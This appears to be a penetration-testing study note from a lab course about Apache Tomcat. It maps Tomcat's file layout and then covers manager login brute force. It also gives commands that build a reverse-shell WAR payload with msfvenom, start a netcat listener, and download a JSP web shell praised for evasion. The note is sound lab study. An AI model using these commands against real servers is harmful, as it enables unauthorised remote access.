refer to htb academy module, which contain full structure of the files in web server.

### Standard Apache Tomcat (tarball) — top-level layout
```
tomcat/                 # CATALINA_HOME (Tomcat distribution root)
├── bin/                # startup/shutdown scripts and utilities
│   ├── startup.sh
│   ├── shutdown.sh
│   ├── catalina.sh
│   ├── setenv.sh       # optional user overrides (not shipped by default)
│   └── version.sh
├── conf/               # main configuration files (CATALINA_BASE/conf)
│   ├── server.xml      # main server config (connectors, engine, hosts)
│   ├── web.xml         # default webapp settings, servlet mappings
│   ├── catalina.properties
│   ├── tomcat-users.xml# user roles for manager/host-manager (if enabled)
│   ├── context.xml     # default context settings for all webapps
│   └── logging.properties
├── lib/                # JVM libraries used by Tomcat (shared jars)
│   └── *.jar
├── logs/               # log files (catalina.out, localhost.*, manager.*)
│   └── catalina.out
├── webapps/            # default place for webapp deployments (WARs + dirs)
│   ├── ROOT/           # default webapp (served at /)
│   ├── manager/        # manager webapp (if installed)
│   ├── host-manager/   # host-manager webapp (if installed)
│   └── examples/       # example apps (optional)
├── temp/               # temporary files
├── work/               # compiled JSPs and session serialization (per app)
└── NOTICE, RELEASE-NOTES, LICENSE, RUNNING.txt
```

### Debian/Ubuntu package layout (apt-installed Tomcat)
```
/etc/tomcat9/           # configuration (equivalent to conf/)
├── server.xml
├── tomcat-users.xml
├── context.xml
/var/lib/tomcat9/       # webapps and some runtime state
├── webapps/
├── work/
/var/log/tomcat9/       # logs (catalina.out, localhost.*)
├── catalina.out
/usr/share/tomcat9/     # shared files and libs (CATALINA_HOME-like)
└── bin/                # startup scripts (packaged wrappers)

```

### Per-webapp layout inside `webapps/<app>/`
```
webapps/yourapp/
├── META-INF/
│   └── MANIFEST.MF
│   └── context.xml       # optional per-app context (overrides conf/context.xml)
├── WEB-INF/
│   ├── web.xml           # webapp-specific servlet mappings & filters
│   ├── classes/          # application classes (unpacked)
│   └── lib/              # webapp-scoped jars
└── index.jsp, static assets...

```

## Login Brute Force
using burp intruder or `scanner/http/tomcat_mgr_login` metasploit module.

Upload malicious file 
```sh
slomkm@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
slomkm@htb[/htb]$ nc -lnvp 4443
# or using this for webshell, if we can't make reverse shell becasue firewall.
slomkm@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```

[This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and good for evasion